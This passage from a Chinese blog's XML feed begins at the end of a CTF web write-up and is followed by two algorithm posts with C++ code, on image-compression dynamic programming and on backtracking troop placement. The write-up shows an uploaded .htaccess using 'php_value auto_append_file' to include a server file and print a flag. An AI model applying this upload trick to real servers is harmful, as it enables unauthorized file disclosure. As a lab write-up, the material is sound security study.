class="line-numbers-rows"><span></span></span></code></pre><p><code>wp</code>说的要把正斜杠编码<code>%2f</code>传入才行，原因未知</p><p>写入<code>.htaccess</code>文件后上传，在上传随便一个<code>php</code>文件，这样访问<code>php</code>文件时就会执行</p><p><img src="https://img-blog.csdnimg.cn/img_convert/133722e52e0bfef4d0bc3f65244879b1.png#pic_center" alt=""></p><p>查到<code>flag</code>文件名</p><hr><ul><li>第二步，再修改<code>.htaccess</code>内容，包含文件名</li></ul><pre class="line-numbers language-none"><code class="language-none">php_value auto_append_file /home/hiahiahia_flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再次上传<code>.htaccess</code>文件，访问<code>php</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/90790197bae3e7630e5f802b1fae655a.png#pic_center" alt=""></p><p>拿到<code>flag:cyberpeace{1b39ac65b450f1a0b22e5b073c851347}</code></p><hr><blockquote><p><strong>知识点：</strong></p><p><strong>1.代码审计</strong></p><p><strong>2.文件包含</strong></p><p><strong>3.htaccess</strong></p></blockquote><h2 id="0x002-结束语"><a href="#0x002-结束语" class="headerlink" title="0x002 结束语"></a>0x002 结束语</h2><hr><blockquote><p><strong><em>自信至上 禁止低头 我心里有一簇迎着烈阳而生的花</em></strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 博客篇 </category>
          
          <category> CTF笔记篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像压缩问题</title>
      <link href="posts/c531792e.html"/>
      <url>posts/c531792e.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x001-问题描述"><a href="#0x001-问题描述" class="headerlink" title="0x001 问题描述"></a>0x001 问题描述</h2><hr><p>  给定一张灰度图，其像素为长度为$n$的灰度值序列：{$p_1,p_2,\cdots,p_n$}，其中$p_i \in [0:1:255]$可表示为8位二进制数。现使用一种变位压缩方式对图像进行压缩，具体压缩过程如下：</p><p> 将{$p_1,p_2,\cdots,p_n$}分割成为$m$段：$S_1,S_2,\cdots,S_m$；<br> $l[i]$为$S_i$段的像素数，要求$l[i]\leq 256$；<br> $h_i$为$S_i$段中最大像素灰度值对应的二进制位数，则有</p><script type="math/tex; mode=display">h_i=\left \lceil\log\left(\max\limits_{p_k \in s_i}\{p_k\}+1\right)\right\rceil</script><p> $b[i]$为$S_i$段中所有像素的灰度值二进制表示的最小位数，则有</p><script type="math/tex; mode=display">h_i \leq b[i] \leq 8</script><p>每个分段$S_i$的段头都有11位</p><p> $b[i]\leq 8$的二进制表示：3位</p><p> $l[i]\leq 256$的二进制表示：8位</p><p> $S_i$段的二进制总位数（占用空间）：$11+b[i]\times l[i]$；</p><p>可以看出，不同的分段方案$T={S_1,S_2,\cdots,S_j}$导致不同的变位压缩结果，即占用不同大小的总空间。现需要确定空间占用最小的分段方案，即</p><script type="math/tex; mode=display">\min\limits_{T}\left\{\sum_{i=1}^{j}(b[i]\times l[i]+11)\right\}</script><h2 id="0x002-约束条件"><a href="#0x002-约束条件" class="headerlink" title="0x002 约束条件"></a>0x002 约束条件</h2><hr><p>图像压缩问题中约束条件是：$l[i]\leq 256$，即每个段中的像素数不超过256个。也就是说只要不违背这个约束条件的所有解均是可行解。</p><h2 id="0x003-目标函数"><a href="#0x003-目标函数" class="headerlink" title="0x003 目标函数"></a>0x003 目标函数</h2><hr><p>图像压缩问题是最小化问题，其目标函数是：各个分段占用空间之和，即</p><script type="math/tex; mode=display">\sum_{i=1}^{j}(b[i]\times l[i]+11)</script><h2 id="0x004-算法设计"><a href="#0x004-算法设计" class="headerlink" title="0x004 算法设计"></a>0x004 算法设计</h2><hr><h3 id="子问题边界参数化"><a href="#子问题边界参数化" class="headerlink" title="子问题边界参数化"></a>子问题边界参数化</h3><p>在该问题中，我们将问题的左侧边界固定，右侧边界进行参数化，所有子问题可建模为：像素序列$P_i={p_1,p_2,\cdots,p_i}, i=1,2,\cdots,n$。</p><h3 id="递推方程设计"><a href="#递推方程设计" class="headerlink" title="递推方程设计"></a>递推方程设计</h3><p>设$s[i]$是像素序列$P_i={p_1,p_2,\cdots,p_i}，i=1,2,\cdots,n$的最优分段所需存储的位数，则递推关系设计如下：</p><script type="math/tex; mode=display">\begin{cases}    s[i]=\min\limits_{1\leq j \leq \min\{i,256\}}\left\{s[i-j]+j\times b_{max}(i-j+1,i)+11\right\} \\    s[0] = 0\end{cases}</script><p>其中，$b<em>{max}(i-j+1,i)=\left\lceil \log \left ( \max\limits</em>{p_k \in S_m}p_k + 1 \right )\right\rceil \leq 8$。</p><h2 id="0x005-算法的伪代码描述"><a href="#0x005-算法的伪代码描述" class="headerlink" title="0x005 算法的伪代码描述"></a>0x005 算法的伪代码描述</h2><hr><pre class="line-numbers language-{r," data-language="{r,"><div class="caption"><span>tidy</span></div><code class="language-{r,"> function Compress(n, p, l, s, b) lmax ← 256;header ← 11;s[0] ← 0for i = 1 → n dob[i] ← length(p[i])bmax ← b[i]s[i] ← s[i − 1] + bmaxl[i] ← 1for j = 2 → min i, lmax doif bmax &lt; b[i − j + 1] then bmax ← b[i − j + 1] if s[i] &gt; s[i − j] + j ∗ bmax then s[i] ← s[i − j] + j ∗ bmax l[i] ← j s[i] ← s[i] + header return s, b, l end function function Traceback(n, i, s, l)i ← 0if n == 0 thenreturnTraceback(n − l[n], i, s, l)s[i + +] ← n − l[n]end function<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x006-算法时空效率估计"><a href="#0x006-算法时空效率估计" class="headerlink" title="0x006 算法时空效率估计"></a>0x006 算法时空效率估计</h2><hr><p>(1）估计算法Compress的时间复杂度，试给出详细过程。</p><p>Compress只需$O(n)$,由于在算法中j的次数不超过256次，故对每一个确定的i可在$O(1)$时间内完成，因此时间复杂度为$O(n)$.</p><p>(2)估计算法Traceback的时间复杂度，试给出详细过程。</p><p>由于数组$l[i],b[i]$记录了最优分段所需的信息，最优分段的最后一段的段长度和像素位数分别存在$l[n],b[n]$中，其前一段的段长度和像素位数存储于$l[n-l[n]]$和$b[n-l[n]]$中，依次类推，在$O(n)$时间内构造最优解。</p><h2 id="0x007-编码实现"><a href="#0x007-编码实现" class="headerlink" title="0x007 编码实现"></a>0x007 编码实现</h2><hr><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;vector&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token comment">//灰度值二进制位数 </span><span class="token keyword">int</span> <span class="token function">Length</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">=</span> i<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>i <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>k <span class="token operator">++</span><span class="token punctuation">;</span>i <span class="token operator">=</span> i<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> k<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//迭代备忘录实现动态规划 </span><span class="token keyword">void</span> <span class="token function">Compress</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token operator">&amp;</span>p<span class="token punctuation">,</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token operator">&amp;</span>l<span class="token punctuation">,</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token operator">&amp;</span>b<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> lmax <span class="token operator">=</span> <span class="token number">256</span><span class="token punctuation">;</span><span class="token keyword">int</span> header <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span><span class="token comment">//分段首部 </span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> bmax<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">Length</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>bmax <span class="token operator">=</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> bmax<span class="token punctuation">;</span>l<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">&gt;</span> lmax<span class="token punctuation">)</span><span class="token punctuation">{</span>k <span class="token operator">=</span> lmax<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>k <span class="token operator">=</span> i<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//k取lmax和 i的较小值 </span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>j <span class="token operator">&lt;=</span> k<span class="token punctuation">;</span>j <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>bmax <span class="token operator">&lt;</span> b<span class="token punctuation">[</span>i<span class="token operator">-</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>bmax <span class="token operator">=</span> b<span class="token punctuation">[</span>i<span class="token operator">-</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&gt;</span> s<span class="token punctuation">[</span>i<span class="token operator">-</span>j<span class="token punctuation">]</span><span class="token operator">+</span>j<span class="token operator">*</span>bmax<span class="token punctuation">)</span><span class="token punctuation">{</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token operator">-</span>j<span class="token punctuation">]</span><span class="token operator">+</span>j<span class="token operator">*</span>bmax<span class="token punctuation">;</span>l<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span><span class="token comment">//记录分段 </span><span class="token punctuation">}</span><span class="token punctuation">}</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> header<span class="token punctuation">;</span><span class="token comment">//加上首部 </span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">//递归追踪解 </span><span class="token keyword">void</span> <span class="token function">Traceback</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span><span class="token keyword">int</span><span class="token operator">&amp;</span> i<span class="token punctuation">,</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token operator">&amp;</span>l<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">Traceback</span><span class="token punctuation">(</span>n<span class="token operator">-</span>l<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span>s<span class="token punctuation">,</span>l<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> n<span class="token operator">-</span>l<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//用s表记录分段位置 </span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> n<span class="token punctuation">;</span>cin <span class="token operator">&gt;&gt;</span> n<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> s<span class="token punctuation">,</span>b<span class="token punctuation">,</span>l<span class="token punctuation">,</span>p<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>s<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>b<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>l<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> p1<span class="token punctuation">;</span>cin <span class="token operator">&gt;&gt;</span> p1<span class="token punctuation">;</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> p1<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">Compress</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>p<span class="token punctuation">,</span>s<span class="token punctuation">,</span>l<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"最小存储位数："</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">Traceback</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>m<span class="token punctuation">,</span>s<span class="token punctuation">,</span>l<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">=</span> n<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"共分段数:"</span> <span class="token operator">&lt;&lt;</span> m <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>j <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span>j <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>l<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> l<span class="token punctuation">[</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>b<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>j <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span>j <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"此段个数："</span> <span class="token operator">&lt;&lt;</span> l<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"所需储存位数："</span> <span class="token operator">&lt;&lt;</span> b<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x008-结果展示"><a href="#0x008-结果展示" class="headerlink" title="0x008 结果展示"></a>0x008 结果展示</h2><hr><p><img src="https://img-blog.csdnimg.cn/20210714154934521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDMxODU1,size_16,color_FFFFFF,t_70#pic_center" alt="结果"></p><h2 id="0x009-结束语"><a href="#0x009-结束语" class="headerlink" title="0x009 结束语"></a>0x009 结束语</h2><blockquote><p><strong><em>若结局非你所愿，请在尘埃定前奋力一搏</em></strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 博客篇 </category>
          
          <category> 算法篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法设计与分析 </tag>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排兵布阵问题</title>
      <link href="posts/7f393998.html"/>
      <url>posts/7f393998.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x001-问题描述"><a href="#0x001-问题描述" class="headerlink" title="0x001 问题描述"></a>0x001 问题描述</h2><hr><p>  某游戏中，不同的兵种处于不同的地形上时，其攻击能力也一样，现有n个不同兵种的角色$(1, 2, \cdots, n)$，需安排在某战区$n$个点上，角色$i$在$j$点上的攻击力为$A_{ij}$，试设计一个布阵方案，使总的攻击力最大。注：个人决定A矩阵的初始化工作。</p><p><img src="https://img-blog.csdnimg.cn/20210714150851663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDMxODU1,size_16,color_FFFFFF,t_70#pic_center" alt="说明图"></p><h2 id="0x002-目标函数"><a href="#0x002-目标函数" class="headerlink" title="0x002 目标函数"></a>0x002 目标函数</h2><hr><script type="math/tex; mode=display">\max \{ \sum_{i=1}^n power_i\}</script><h2 id="0x003-解向量"><a href="#0x003-解向量" class="headerlink" title="0x003 解向量"></a>0x003 解向量</h2><hr><p>用元组$(x_1,x_2,…x_n)$表示解，$x_i$表示角色i的位置。</p><h2 id="0x004-显式约束"><a href="#0x004-显式约束" class="headerlink" title="0x004 显式约束"></a>0x004 显式约束</h2><hr><script type="math/tex; mode=display">S_i=\{1,2,...,n\},1\leq i \leq n</script><h2 id="0x005-状态空间树"><a href="#0x005-状态空间树" class="headerlink" title="0x005 状态空间树"></a>0x005 状态空间树</h2><hr><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><p>状态空间树是一颗排列树。</p><h3 id="候选解规模"><a href="#候选解规模" class="headerlink" title="候选解规模"></a>候选解规模</h3><p>叶子结点数有$n!$个。</p><h2 id="0x006-隐式约束"><a href="#0x006-隐式约束" class="headerlink" title="0x006 隐式约束"></a>0x006 隐式约束</h2><hr><p>对任意$1 \leq i,j \leq n$,当$i \neq j$时，$x_i \neq x_j$</p><h2 id="0x007-算法设计"><a href="#0x007-算法设计" class="headerlink" title="0x007 算法设计"></a>0x007 算法设计</h2><hr><h3 id="算法的伪代码描述"><a href="#算法的伪代码描述" class="headerlink" title="算法的伪代码描述"></a>算法的伪代码描述</h3><pre class="line-numbers language-none"><code class="language-none">function backTrack(t, n)if t &gt; n then power ← 0 for i = 1 → n do power ← power + power1if power &lt; powermax then powermax ← power x1 ← x else for i = 1 → n do x[t] ← i  if Position(t) then backTrack(t + 1) end function function Position(k) for i = 1 → k − 1 doif x[i] == x[k] then return false return true end function<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="时间复杂度估计"><a href="#时间复杂度估计" class="headerlink" title="时间复杂度估计"></a>时间复杂度估计</h3><script type="math/tex; mode=display">W(n) = p(n)f(n)</script><p>$p(n)$为求解一个叶子节点的时间，$f(n)$为叶子节点的个数</p><h3 id="编码实现"><a href="#编码实现" class="headerlink" title="编码实现"></a>编码实现</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;vector&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> x<span class="token punctuation">,</span>x1<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token operator">&gt;</span> p<span class="token punctuation">;</span><span class="token keyword">int</span> powermax <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token comment">//判断角色k的位置是否可行 </span><span class="token keyword">bool</span> <span class="token function">position</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> k<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">==</span> x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//回溯法求最优解 </span><span class="token keyword">void</span> <span class="token function">backTrack</span><span class="token punctuation">(</span><span class="token keyword">int</span> t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>t <span class="token operator">&gt;</span> n<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//求总攻击力并更新最大值 </span><span class="token keyword">int</span> power <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>power <span class="token operator">=</span> power <span class="token operator">+</span> p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span>power <span class="token operator">&gt;</span> powermax<span class="token punctuation">)</span><span class="token punctuation">{</span>powermax <span class="token operator">=</span> power<span class="token punctuation">;</span>x1 <span class="token operator">=</span> x<span class="token punctuation">;</span><span class="token comment">//记录当前最优解的排列 </span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token comment">//遍历可行排列 </span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>x<span class="token punctuation">[</span>t<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">position</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">backTrack</span><span class="token punctuation">(</span>t<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>cin <span class="token operator">&gt;&gt;</span> n<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>x<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>x1<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>p<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>j <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> p1<span class="token punctuation">;</span>cin <span class="token operator">&gt;&gt;</span> p1<span class="token punctuation">;</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> p1<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token 